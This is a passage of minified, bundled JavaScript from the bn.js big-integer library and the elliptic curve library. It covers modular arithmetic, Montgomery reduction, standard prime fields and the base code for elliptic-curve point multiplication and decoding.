                Z.iushln(U),
                se = te.words[te.length - 1] | 0);
                var re = Z.length - te.length, $;
                if (L !== "mod") {
                    $ = new w(null),
                    $.length = re + 1,
                    $.words = new Array($.length);
                    for (var ie = 0; ie < $.length; ie++)
                        $.words[ie] = 0
                }
                var ve = Z.clone()._ishlnsubmul(te, 1, re);
                ve.negative === 0 && (Z = ve,
                $ && ($.words[re] = 1));
                for (var ge = re - 1; ge >= 0; ge--) {
                    var Re = (Z.words[te.length + ge] | 0) * 67108864 + (Z.words[te.length + ge - 1] | 0);
                    for (Re = Math.min(Re / se | 0, 67108863),
                    Z._ishlnsubmul(te, Re, ge); Z.negative !== 0; )
                        Re--,
                        Z.negative = 0,
                        Z._ishlnsubmul(te, 1, ge),
                        Z.isZero() || (Z.negative ^= 1);
                    $ && ($.words[ge] = Re)
                }
                return $ && $.strip(),
                Z.strip(),
                L !== "div" && U !== 0 && Z.iushrn(U),
                {
                    div: $ || null,
                    mod: Z
                }
            }
            ,
            w.prototype.divmod = function(q, L, U) {
                if (O(!q.isZero()),
                this.isZero())
                    return {
                        div: new w(0),
                        mod: new w(0)
                    };
                var Z, te, se;
                return this.negative !== 0 && q.negative === 0 ? (se = this.neg().divmod(q, L),
                L !== "mod" && (Z = se.div.neg()),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.iadd(q)),
                {
                    div: Z,
                    mod: te
                }) : this.negative === 0 && q.negative !== 0 ? (se = this.divmod(q.neg(), L),
                L !== "mod" && (Z = se.div.neg()),
                {
                    div: Z,
                    mod: se.mod
                }) : (this.negative & q.negative) !== 0 ? (se = this.neg().divmod(q.neg(), L),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.isub(q)),
                {
                    div: se.div,
                    mod: te
                }) : q.length > this.length || this.cmp(q) < 0 ? {
                    div: new w(0),
                    mod: this
                } : q.length === 1 ? L === "div" ? {
                    div: this.divn(q.words[0]),
                    mod: null
                } : L === "mod" ? {
                    div: null,
                    mod: new w(this.modn(q.words[0]))
                } : {
                    div: this.divn(q.words[0]),
                    mod: new w(this.modn(q.words[0]))
                } : this._wordDiv(q, L)
            }
            ,
            w.prototype.div = function(q) {
                return this.divmod(q, "div", !1).div
            }
            ,
            w.prototype.mod = function(q) {
                return this.divmod(q, "mod", !1).mod
            }
            ,
            w.prototype.umod = function(q) {
                return this.divmod(q, "mod", !0).mod
            }
            ,
            w.prototype.divRound = function(q) {
                var L = this.divmod(q);
                if (L.mod.isZero())
                    return L.div;
                var U = L.div.negative !== 0 ? L.mod.isub(q) : L.mod
                  , Z = q.ushrn(1)
                  , te = q.andln(1)
                  , se = U.cmp(Z);
                return se < 0 || te === 1 && se === 0 ? L.div : L.div.negative !== 0 ? L.div.isubn(1) : L.div.iaddn(1)
            }
            ,
            w.prototype.modn = function(q) {
                O(q <= 67108863);
                for (var L = (1 << 26) % q, U = 0, Z = this.length - 1; Z >= 0; Z--)
                    U = (L * U + (this.words[Z] | 0)) % q;
                return U
            }
            ,
            w.prototype.idivn = function(q) {
                O(q <= 67108863);
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = (this.words[U] | 0) + L * 67108864;
                    this.words[U] = Z / q | 0,
                    L = Z % q
                }
                return this.strip()
            }
            ,
            w.prototype.divn = function(q) {
                return this.clone().idivn(q)
            }
            ,
            w.prototype.egcd = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = new w(0), de = new w(1), re = 0; L.isEven() && U.isEven(); )
                    L.iushrn(1),
                    U.iushrn(1),
                    ++re;
                for (var $ = U.clone(), ie = L.clone(); !L.isZero(); ) {
                    for (var ve = 0, ge = 1; (L.words[0] & ge) === 0 && ve < 26; ++ve,
                    ge <<= 1)
                        ;
                    if (ve > 0)
                        for (L.iushrn(ve); ve-- > 0; )
                            (Z.isOdd() || te.isOdd()) && (Z.iadd($),
                            te.isub(ie)),
                            Z.iushrn(1),
                            te.iushrn(1);
                    for (var Re = 0, Pe = 1; (U.words[0] & Pe) === 0 && Re < 26; ++Re,
                    Pe <<= 1)
                        ;
                    if (Re > 0)
                        for (U.iushrn(Re); Re-- > 0; )
                            (se.isOdd() || de.isOdd()) && (se.iadd($),
                            de.isub(ie)),
                            se.iushrn(1),
                            de.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(se),
                    te.isub(de)) : (U.isub(L),
                    se.isub(Z),
                    de.isub(te))
                }
                return {
                    a: se,
                    b: de,
                    gcd: U.iushln(re)
                }
            }
            ,
            w.prototype._invmp = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = U.clone(); L.cmpn(1) > 0 && U.cmpn(1) > 0; ) {
                    for (var de = 0, re = 1; (L.words[0] & re) === 0 && de < 26; ++de,
                    re <<= 1)
                        ;
                    if (de > 0)
                        for (L.iushrn(de); de-- > 0; )
                            Z.isOdd() && Z.iadd(se),
                            Z.iushrn(1);
                    for (var $ = 0, ie = 1; (U.words[0] & ie) === 0 && $ < 26; ++$,
                    ie <<= 1)
                        ;
                    if ($ > 0)
                        for (U.iushrn($); $-- > 0; )
                            te.isOdd() && te.iadd(se),
                            te.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(te)) : (U.isub(L),
                    te.isub(Z))
                }
                var ve;
                return L.cmpn(1) === 0 ? ve = Z : ve = te,
                ve.cmpn(0) < 0 && ve.iadd(q),
                ve
            }
            ,
            w.prototype.gcd = function(q) {
                if (this.isZero())
                    return q.abs();
                if (q.isZero())
                    return this.abs();
                var L = this.clone()
                  , U = q.clone();
                L.negative = 0,
                U.negative = 0;
                for (var Z = 0; L.isEven() && U.isEven(); Z++)
                    L.iushrn(1),
                    U.iushrn(1);
                do {
                    for (; L.isEven(); )
                        L.iushrn(1);
                    for (; U.isEven(); )
                        U.iushrn(1);
                    var te = L.cmp(U);
                    if (te < 0) {
                        var se = L;
                        L = U,
                        U = se
                    } else if (te === 0 || U.cmpn(1) === 0)
                        break;
                    L.isub(U)
                } while (!0);
                return U.iushln(Z)
            }
            ,
            w.prototype.invm = function(q) {
                return this.egcd(q).a.umod(q)
            }
            ,
            w.prototype.isEven = function() {
                return (this.words[0] & 1) === 0
            }
            ,
            w.prototype.isOdd = function() {
                return (this.words[0] & 1) === 1
            }
            ,
            w.prototype.andln = function(q) {
                return this.words[0] & q
            }
            ,
            w.prototype.bincn = function(q) {
                O(typeof q == "number");
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return this._expand(U + 1),
                    this.words[U] |= Z,
                    this;
                for (var te = Z, se = U; te !== 0 && se < this.length; se++) {
                    var de = this.words[se] | 0;
                    de += te,
                    te = de >>> 26,
                    de &= 67108863,
                    this.words[se] = de
                }
                return te !== 0 && (this.words[se] = te,
                this.length++),
                this
            }
            ,
            w.prototype.isZero = function() {
                return this.length === 1 && this.words[0] === 0
            }
            ,
            w.prototype.cmpn = function(q) {
                var L = q < 0;
                if (this.negative !== 0 && !L)
                    return -1;
                if (this.negative === 0 && L)
                    return 1;
                this.strip();
                var U;
                if (this.length > 1)
                    U = 1;
                else {
                    L && (q = -q),
                    O(q <= 67108863, "Number is too big");
                    var Z = this.words[0] | 0;
                    U = Z === q ? 0 : Z < q ? -1 : 1
                }
                return this.negative !== 0 ? -U | 0 : U
            }
            ,
            w.prototype.cmp = function(q) {
                if (this.negative !== 0 && q.negative === 0)
                    return -1;
                if (this.negative === 0 && q.negative !== 0)
                    return 1;
                var L = this.ucmp(q);
                return this.negative !== 0 ? -L | 0 : L
            }
            ,
            w.prototype.ucmp = function(q) {
                if (this.length > q.length)
                    return 1;
                if (this.length < q.length)
                    return -1;
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = this.words[U] | 0
                      , te = q.words[U] | 0;
                    if (Z !== te) {
                        Z < te ? L = -1 : Z > te && (L = 1);
                        break
                    }
                }
                return L
            }
            ,
            w.prototype.gtn = function(q) {
                return this.cmpn(q) === 1
            }
            ,
            w.prototype.gt = function(q) {
                return this.cmp(q) === 1
            }
            ,
            w.prototype.gten = function(q) {
                return this.cmpn(q) >= 0
            }
            ,
            w.prototype.gte = function(q) {
                return this.cmp(q) >= 0
            }
            ,
            w.prototype.ltn = function(q) {
                return this.cmpn(q) === -1
            }
            ,
            w.prototype.lt = function(q) {
                return this.cmp(q) === -1
            }
            ,
            w.prototype.lten = function(q) {
                return this.cmpn(q) <= 0
            }
            ,
            w.prototype.lte = function(q) {
                return this.cmp(q) <= 0
            }
            ,
            w.prototype.eqn = function(q) {
                return this.cmpn(q) === 0
            }
            ,
            w.prototype.eq = function(q) {
                return this.cmp(q) === 0
            }
            ,
            w.red = function(q) {
                return new Ee(q)
            }
            ,
            w.prototype.toRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                O(this.negative === 0, "red works only with positives"),
                q.convertTo(this)._forceRed(q)
            }
            ,
            w.prototype.fromRed = function() {
                return O(this.red, "fromRed works only with numbers in reduction context"),
                this.red.convertFrom(this)
            }
            ,
            w.prototype._forceRed = function(q) {
                return this.red = q,
                this
            }
            ,
            w.prototype.forceRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                this._forceRed(q)
            }
            ,
            w.prototype.redAdd = function(q) {
                return O(this.red, "redAdd works only with red numbers"),
                this.red.add(this, q)
            }
            ,
            w.prototype.redIAdd = function(q) {
                return O(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, q)
            }
            ,
            w.prototype.redSub = function(q) {
                return O(this.red, "redSub works only with red numbers"),
                this.red.sub(this, q)
            }
            ,
            w.prototype.redISub = function(q) {
                return O(this.red, "redISub works only with red numbers"),
                this.red.isub(this, q)
            }
            ,
            w.prototype.redShl = function(q) {
                return O(this.red, "redShl works only with red numbers"),
                this.red.shl(this, q)
            }
            ,
            w.prototype.redMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.mul(this, q)
            }
            ,
            w.prototype.redIMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.imul(this, q)
            }
            ,
            w.prototype.redSqr = function() {
                return O(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
            }
            ,
            w.prototype.redISqr = function() {
                return O(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
            }
            ,
            w.prototype.redSqrt = function() {
                return O(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
            }
            ,
            w.prototype.redInvm = function() {
                return O(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
            }
            ,
            w.prototype.redNeg = function() {
                return O(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
            }
            ,
            w.prototype.redPow = function(q) {
                return O(this.red && !q.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, q)
            }
            ;
            var he = {
                k256: null,
                p224: null,
                p192: null,
                p25519: null
            };
            function pe(ce, q) {
                this.name = ce,
                this.p = new w(q,16),
                this.n = this.p.bitLength(),
                this.k = new w(1).iushln(this.n).isub(this.p),
                this.tmp = this._tmp()
            }
            pe.prototype._tmp = function() {
                var q = new w(null);
                return q.words = new Array(Math.ceil(this.n / 13)),
                q
            }
            ,
            pe.prototype.ireduce = function(q) {
                var L = q, U;
                do
                    this.split(L, this.tmp),
                    L = this.imulK(L),
                    L = L.iadd(this.tmp),
                    U = L.bitLength();
                while (U > this.n);
                var Z = U < this.n ? -1 : L.ucmp(this.p);
                return Z === 0 ? (L.words[0] = 0,
                L.length = 1) : Z > 0 ? L.isub(this.p) : L.strip !== void 0 ? L.strip() : L._strip(),
                L
            }
            ,
            pe.prototype.split = function(q, L) {
                q.iushrn(this.n, 0, L)
            }
            ,
            pe.prototype.imulK = function(q) {
                return q.imul(this.k)
            }
            ;
            function ye() {
                pe.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")
            }
            x(ye, pe),
            ye.prototype.split = function(q, L) {
                for (var U = 4194303, Z = Math.min(q.length, 9), te = 0; te < Z; te++)
                    L.words[te] = q.words[te];
                if (L.length = Z,
                q.length <= 9) {
                    q.words[0] = 0,
                    q.length = 1;
                    return
                }
                var se = q.words[9];
                for (L.words[L.length++] = se & U,
                te = 10; te < q.length; te++) {
                    var de = q.words[te] | 0;
                    q.words[te - 10] = (de & U) << 4 | se >>> 22,
                    se = de
                }
                se >>>= 22,
                q.words[te - 10] = se,
                se === 0 && q.length > 10 ? q.length -= 10 : q.length -= 9
            }
            ,
            ye.prototype.imulK = function(q) {
                q.words[q.length] = 0,
                q.words[q.length + 1] = 0,
                q.length += 2;
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = q.words[U] | 0;
                    L += Z * 977,
                    q.words[U] = L & 67108863,
                    L = Z * 64 + (L / 67108864 | 0)
                }
                return q.words[q.length - 1] === 0 && (q.length--,
                q.words[q.length - 1] === 0 && q.length--),
                q
            }
            ;
            function be() {
                pe.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")
            }
            x(be, pe);
            function xe() {
                pe.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")
            }
            x(xe, pe);
            function Ae() {
                pe.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")
            }
            x(Ae, pe),
            Ae.prototype.imulK = function(q) {
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = (q.words[U] | 0) * 19 + L
                      , te = Z & 67108863;
                    Z >>>= 26,
                    q.words[U] = te,
                    L = Z
                }
                return L !== 0 && (q.words[q.length++] = L),
                q
            }
            ,
            w._prime = function(q) {
                if (he[q])
                    return he[q];
                var L;
                if (q === "k256")
                    L = new ye;
                else if (q === "p224")
                    L = new be;
                else if (q === "p192")
                    L = new xe;
                else if (q === "p25519")
                    L = new Ae;
                else
                    throw new Error("Unknown prime " + q);
                return he[q] = L,
                L
            }
            ;
            function Ee(ce) {
                if (typeof ce == "string") {
                    var q = w._prime(ce);
                    this.m = q.p,
                    this.prime = q
                } else
                    O(ce.gtn(1), "modulus must be greater than 1"),
                    this.m = ce,
                    this.prime = null
            }
            Ee.prototype._verify1 = function(q) {
                O(q.negative === 0, "red works only with positives"),
                O(q.red, "red works only with red numbers")
            }
            ,
            Ee.prototype._verify2 = function(q, L) {
                O((q.negative | L.negative) === 0, "red works only with positives"),
                O(q.red && q.red === L.red, "red works only with red numbers")
            }
            ,
            Ee.prototype.imod = function(q) {
                return this.prime ? this.prime.ireduce(q)._forceRed(this) : q.umod(this.m)._forceRed(this)
            }
            ,
            Ee.prototype.neg = function(q) {
                return q.isZero() ? q.clone() : this.m.sub(q)._forceRed(this)
            }
            ,
            Ee.prototype.add = function(q, L) {
                this._verify2(q, L);
                var U = q.add(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.iadd = function(q, L) {
                this._verify2(q, L);
                var U = q.iadd(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U
            }
            ,
            Ee.prototype.sub = function(q, L) {
                this._verify2(q, L);
                var U = q.sub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.isub = function(q, L) {
                this._verify2(q, L);
                var U = q.isub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U
            }
            ,
            Ee.prototype.shl = function(q, L) {
                return this._verify1(q),
                this.imod(q.ushln(L))
            }
            ,
            Ee.prototype.imul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.imul(L))
            }
            ,
            Ee.prototype.mul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.mul(L))
            }
            ,
            Ee.prototype.isqr = function(q) {
                return this.imul(q, q.clone())
            }
            ,
            Ee.prototype.sqr = function(q) {
                return this.mul(q, q)
            }
            ,
            Ee.prototype.sqrt = function(q) {
                if (q.isZero())
                    return q.clone();
                var L = this.m.andln(3);
                if (O(L % 2 === 1),
                L === 3) {
                    var U = this.m.add(new w(1)).iushrn(2);
                    return this.pow(q, U)
                }
                for (var Z = this.m.subn(1), te = 0; !Z.isZero() && Z.andln(1) === 0; )
                    te++,
                    Z.iushrn(1);
                O(!Z.isZero());
                var se = new w(1).toRed(this)
                  , de = se.redNeg()
                  , re = this.m.subn(1).iushrn(1)
                  , $ = this.m.bitLength();
                for ($ = new w(2 * $ * $).toRed(this); this.pow($, re).cmp(de) !== 0; )
                    $.redIAdd(de);
                for (var ie = this.pow($, Z), ve = this.pow(q, Z.addn(1).iushrn(1)), ge = this.pow(q, Z), Re = te; ge.cmp(se) !== 0; ) {
                    for (var Pe = ge, Ie = 0; Pe.cmp(se) !== 0; Ie++)
                        Pe = Pe.redSqr();
                    O(Ie < Re);
                    var Te = this.pow(ie, new w(1).iushln(Re - Ie - 1));
                    ve = ve.redMul(Te),
                    ie = Te.redSqr(),
                    ge = ge.redMul(ie),
                    Re = Ie
                }
                return ve
            }
            ,
            Ee.prototype.invm = function(q) {
                var L = q._invmp(this.m);
                return L.negative !== 0 ? (L.negative = 0,
                this.imod(L).redNeg()) : this.imod(L)
            }
            ,
            Ee.prototype.pow = function(q, L) {
                if (L.isZero())
                    return new w(1).toRed(this);
                if (L.cmpn(1) === 0)
                    return q.clone();
                var U = 4
                  , Z = new Array(1 << U);
                Z[0] = new w(1).toRed(this),
                Z[1] = q;
                for (var te = 2; te < Z.length; te++)
                    Z[te] = this.mul(Z[te - 1], q);
                var se = Z[0]
                  , de = 0
                  , re = 0
                  , $ = L.bitLength() % 26;
                for ($ === 0 && ($ = 26),
                te = L.length - 1; te >= 0; te--) {
                    for (var ie = L.words[te], ve = $ - 1; ve >= 0; ve--) {
                        var ge = ie >> ve & 1;
                        if (se !== Z[0] && (se = this.sqr(se)),
                        ge === 0 && de === 0) {
                            re = 0;
                            continue
                        }
                        de <<= 1,
                        de |= ge,
                        re++,
                        !(re !== U && (te !== 0 || ve !== 0)) && (se = this.mul(se, Z[de]),
                        re = 0,
                        de = 0)
                    }
                    $ = 26
                }
                return se
            }
            ,
            Ee.prototype.convertTo = function(q) {
                var L = q.umod(this.m);
                return L === q ? L.clone() : L
            }
            ,
            Ee.prototype.convertFrom = function(q) {
                var L = q.clone();
                return L.red = null,
                L
            }
            ,
            w.mont = function(q) {
                return new Be(q)
            }
            ;
            function Be(ce) {
                Ee.call(this, ce),
                this.shift = this.m.bitLength(),
                this.shift % 26 !== 0 && (this.shift += 26 - this.shift % 26),
                this.r = new w(1).iushln(this.shift),
                this.r2 = this.imod(this.r.sqr()),
                this.rinv = this.r._invmp(this.m),
                this.minv = this.rinv.mul(this.r).isubn(1).div(this.m),
                this.minv = this.minv.umod(this.r),
                this.minv = this.r.sub(this.minv)
            }
            x(Be, Ee),
            Be.prototype.convertTo = function(q) {
                return this.imod(q.ushln(this.shift))
            }
            ,
            Be.prototype.convertFrom = function(q) {
                var L = this.imod(q.mul(this.rinv));
                return L.red = null,
                L
            }
            ,
            Be.prototype.imul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return q.words[0] = 0,
                    q.length = 1,
                    q;
                var U = q.imul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.mul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return new w(0)._forceRed(this);
                var U = q.mul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.invm = function(q) {
                var L = this.imod(q._invmp(this.m).mul(this.r2));
                return L._forceRed(this)
            }
        }
        )(_, bn$6)
    }(bn$7)),
    bn$7.exports
}
var utils$7 = {}, hasRequiredUtils$6;
function requireUtils$6() {
    return hasRequiredUtils$6 || (hasRequiredUtils$6 = 1,
    function(_) {
        var M = _;
        function j(w, b) {
            if (Array.isArray(w))
                return w.slice();
            if (!w)
                return [];
            var X = [];
            if (typeof w != "string") {
                for (var Y = 0; Y < w.length; Y++)
                    X[Y] = w[Y] | 0;
                return X
            }
            if (b === "hex") {
                w = w.replace(/[^a-z0-9]+/ig, ""),
                w.length % 2 !== 0 && (w = "0" + w);
                for (var Y = 0; Y < w.length; Y += 2)
                    X.push(parseInt(w[Y] + w[Y + 1], 16))
            } else
                for (var Y = 0; Y < w.length; Y++) {
                    var F = w.charCodeAt(Y)
                      , V = F >> 8
                      , K = F & 255;
                    V ? X.push(V, K) : X.push(K)
                }
            return X
        }
        M.toArray = j;
        function O(w) {
            return w.length === 1 ? "0" + w : w
        }
        M.zero2 = O;
        function x(w) {
            for (var b = "", X = 0; X < w.length; X++)
                b += O(w[X].toString(16));
            return b
        }
        M.toHex = x,
        M.encode = function(b, X) {
            return X === "hex" ? x(b) : b
        }
    }(utils$7)),
    utils$7
}
var hasRequiredUtils$5;
function requireUtils$5() {
    return hasRequiredUtils$5 || (hasRequiredUtils$5 = 1,
    function(_) {
        var M = _
          , j = requireBn$3()
          , O = requireMinimalisticAssert()
          , x = requireUtils$6();
        M.assert = O,
        M.toArray = x.toArray,
        M.zero2 = x.zero2,
        M.toHex = x.toHex,
        M.encode = x.encode;
        function w(V, K, Q) {
            var ee = new Array(Math.max(V.bitLength(), Q) + 1), ae;
            for (ae = 0; ae < ee.length; ae += 1)
                ee[ae] = 0;
            var ne = 1 << K + 1
              , oe = V.clone();
            for (ae = 0; ae < ee.length; ae++) {
                var ue, fe = oe.andln(ne - 1);
                oe.isOdd() ? (fe > (ne >> 1) - 1 ? ue = (ne >> 1) - fe : ue = fe,
                oe.isubn(ue)) : ue = 0,
                ee[ae] = ue,
                oe.iushrn(1)
            }
            return ee
        }
        M.getNAF = w;
        function b(V, K) {
            var Q = [[], []];
            V = V.clone(),
            K = K.clone();
            for (var ee = 0, ae = 0, ne; V.cmpn(-ee) > 0 || K.cmpn(-ae) > 0; ) {
                var oe = V.andln(3) + ee & 3
                  , ue = K.andln(3) + ae & 3;
                oe === 3 && (oe = -1),
                ue === 3 && (ue = -1);
                var fe;
                (oe & 1) === 0 ? fe = 0 : (ne = V.andln(7) + ee & 7,
                (ne === 3 || ne === 5) && ue === 2 ? fe = -oe : fe = oe),
                Q[0].push(fe);
                var he;
                (ue & 1) === 0 ? he = 0 : (ne = K.andln(7) + ae & 7,
                (ne === 3 || ne === 5) && oe === 2 ? he = -ue : he = ue),
                Q[1].push(he),
                2 * ee === fe + 1 && (ee = 1 - ee),
                2 * ae === he + 1 && (ae = 1 - ae),
                V.iushrn(1),
                K.iushrn(1)
            }
            return Q
        }
        M.getJSF = b;
        function X(V, K, Q) {
            var ee = "_" + K;
            V.prototype[K] = function() {
                return this[ee] !== void 0 ? this[ee] : this[ee] = Q.call(this)
            }
        }
        M.cachedProperty = X;
        function Y(V) {
            return typeof V == "string" ? M.toArray(V, "hex") : V
        }
        M.parseBytes = Y;
        function F(V) {
            return new j(V,"hex","le")
        }
        M.intFromLE = F
    }(utils$8)),
    utils$8
}
var curve = {}, base$1, hasRequiredBase$1;
function requireBase$1() {
    if (hasRequiredBase$1)
        return base$1;
    hasRequiredBase$1 = 1;
    var _ = requireBn$3()
      , M = requireUtils$5()
      , j = M.getNAF
      , O = M.getJSF
      , x = M.assert;
    function w(X, Y) {
        this.type = X,
        this.p = new _(Y.p,16),
        this.red = Y.prime ? _.red(Y.prime) : _.mont(this.p),
        this.zero = new _(0).toRed(this.red),
        this.one = new _(1).toRed(this.red),
        this.two = new _(2).toRed(this.red),
        this.n = Y.n && new _(Y.n,16),
        this.g = Y.g && this.pointFromJSON(Y.g, Y.gRed),
        this._wnafT1 = new Array(4),
        this._wnafT2 = new Array(4),
        this._wnafT3 = new Array(4),
        this._wnafT4 = new Array(4),
        this._bitLength = this.n ? this.n.bitLength() : 0;
        var F = this.n && this.p.div(this.n);
        !F || F.cmpn(100) > 0 ? this.redN = null : (this._maxwellTrick = !0,
        this.redN = this.n.toRed(this.red))
    }
    base$1 = w,
    w.prototype.point = function() {
        throw new Error("Not implemented")
    }
    ,
    w.prototype.validate = function() {
        throw new Error("Not implemented")
    }
    ,
    w.prototype._fixedNafMul = function(Y, F) {
        x(Y.precomputed);
        var V = Y._getDoubles()
          , K = j(F, 1, this._bitLength)
          , Q = (1 << V.step + 1) - (V.step % 2 === 0 ? 2 : 1);
        Q /= 3;
        var ee = [], ae, ne;
        for (ae = 0; ae < K.length; ae += V.step) {
            ne = 0;
            for (var oe = ae + V.step - 1; oe >= ae; oe--)
                ne = (ne << 1) + K[oe];
            ee.push(ne)
        }
        for (var ue = this.jpoint(null, null, null), fe = this.jpoint(null, null, null), he = Q; he > 0; he--) {
            for (ae = 0; ae < ee.length; ae++)
                ne = ee[ae],
                ne === he ? fe = fe.mixedAdd(V.points[ae]) : ne === -he && (fe = fe.mixedAdd(V.points[ae].neg()));
            ue = ue.add(fe)
        }
        return ue.toP()
    }
    ,
    w.prototype._wnafMul = function(Y, F) {
        var V = 4
          , K = Y._getNAFPoints(V);
        V = K.wnd;
        for (var Q = K.points, ee = j(F, V, this._bitLength), ae = this.jpoint(null, null, null), ne = ee.length - 1; ne >= 0; ne--) {
            for (var oe = 0; ne >= 0 && ee[ne] === 0; ne--)
                oe++;
            if (ne >= 0 && oe++,
            ae = ae.dblp(oe),
            ne < 0)
                break;
            var ue = ee[ne];
            x(ue !== 0),
            Y.type === "affine" ? ue > 0 ? ae = ae.mixedAdd(Q[ue - 1 >> 1]) : ae = ae.mixedAdd(Q[-ue - 1 >> 1].neg()) : ue > 0 ? ae = ae.add(Q[ue - 1 >> 1]) : ae = ae.add(Q[-ue - 1 >> 1].neg())
        }
        return Y.type === "affine" ? ae.toP() : ae
    }
    ,
    w.prototype._wnafMulAdd = function(Y, F, V, K, Q) {
        var ee = this._wnafT1, ae = this._wnafT2, ne = this._wnafT3, oe = 0, ue, fe, he;
        for (ue = 0; ue < K; ue++) {
            he = F[ue];
            var pe = he._getNAFPoints(Y);
            ee[ue] = pe.wnd,
            ae[ue] = pe.points
        }
        for (ue = K - 1; ue >= 1; ue -= 2) {
            var ye = ue - 1
              , be = ue;
            if (ee[ye] !== 1 || ee[be] !== 1) {
                ne[ye] = j(V[ye], ee[ye], this._bitLength),
                ne[be] = j(V[be], ee[be], this._bitLength),
                oe = Math.max(ne[ye].length, oe),
                oe = Math.max(ne[be].length, oe);
                continue
            }
            var xe = [F[ye], null, null, F[be]];
            F[ye].y.cmp(F[be].y) === 0 ? (xe[1] = F[ye].add(F[be]),
            xe[2] = F[ye].toJ().mixedAdd(F[be].neg())) : F[ye].y.cmp(F[be].y.redNeg()) === 0 ? (xe[1] = F[ye].toJ().mixedAdd(F[be]),
            xe[2] = F[ye].add(F[be].neg())) : (xe[1] = F[ye].toJ().mixedAdd(F[be]),
            xe[2] = F[ye].toJ().mixedAdd(F[be].neg()));
            var Ae = [-3, -1, -5, -7, 0, 7, 5, 1, 3]
              , Ee = O(V[ye], V[be]);
            for (oe = Math.max(Ee[0].length, oe),
            ne[ye] = new Array(oe),
            ne[be] = new Array(oe),
            fe = 0; fe < oe; fe++) {
                var Be = Ee[0][fe] | 0
                  , ce = Ee[1][fe] | 0;
                ne[ye][fe] = Ae[(Be + 1) * 3 + (ce + 1)],
                ne[be][fe] = 0,
                ae[ye] = xe
            }
        }
        var q = this.jpoint(null, null, null)
          , L = this._wnafT4;
        for (ue = oe; ue >= 0; ue--) {
            for (var U = 0; ue >= 0; ) {
                var Z = !0;
                for (fe = 0; fe < K; fe++)
                    L[fe] = ne[fe][ue] | 0,
                    L[fe] !== 0 && (Z = !1);
                if (!Z)
                    break;
                U++,
                ue--
            }
            if (ue >= 0 && U++,
            q = q.dblp(U),
            ue < 0)
                break;
            for (fe = 0; fe < K; fe++) {
                var te = L[fe];
                te !== 0 && (te > 0 ? he = ae[fe][te - 1 >> 1] : te < 0 && (he = ae[fe][-te - 1 >> 1].neg()),
                he.type === "affine" ? q = q.mixedAdd(he) : q = q.add(he))
            }
        }
        for (ue = 0; ue < K; ue++)
            ae[ue] = null;
        return Q ? q : q.toP()
    }
    ;
    function b(X, Y) {
        this.curve = X,
        this.type = Y,
        this.precomputed = null
    }
    return w.BasePoint = b,
    b.prototype.eq = function() {
        throw new Error("Not implemented")
    }
    ,
    b.prototype.validate = function() {
        return this.curve.validate(this)
    }
    ,
    w.prototype.decodePoint = function(Y, F) {
        Y = M.toArray(Y, F);
        var V = this.p.byteLength();
        if ((Y[0] === 4 || Y[0] === 6 || Y[0] === 7) && Y.length - 1 === 2 * V) {
            Y[0] === 6 ? x(Y[Y.length - 1] % 2 === 0) : Y[0] === 7 && x(Y[Y.length - 1] % 2 === 1);
            var K = this.point(Y.slice(1, 1 + V), Y.slice(1 + V, 1 + 2 * V));
            return K
        } else if ((Y[0] === 2 || Y[0] === 3) && Y.length - 1 === V)
            return this.pointFromX(Y.slice(1, 1 + V), Y[0] === 3);
        throw new Error("Unknown point format")
    }
    ,
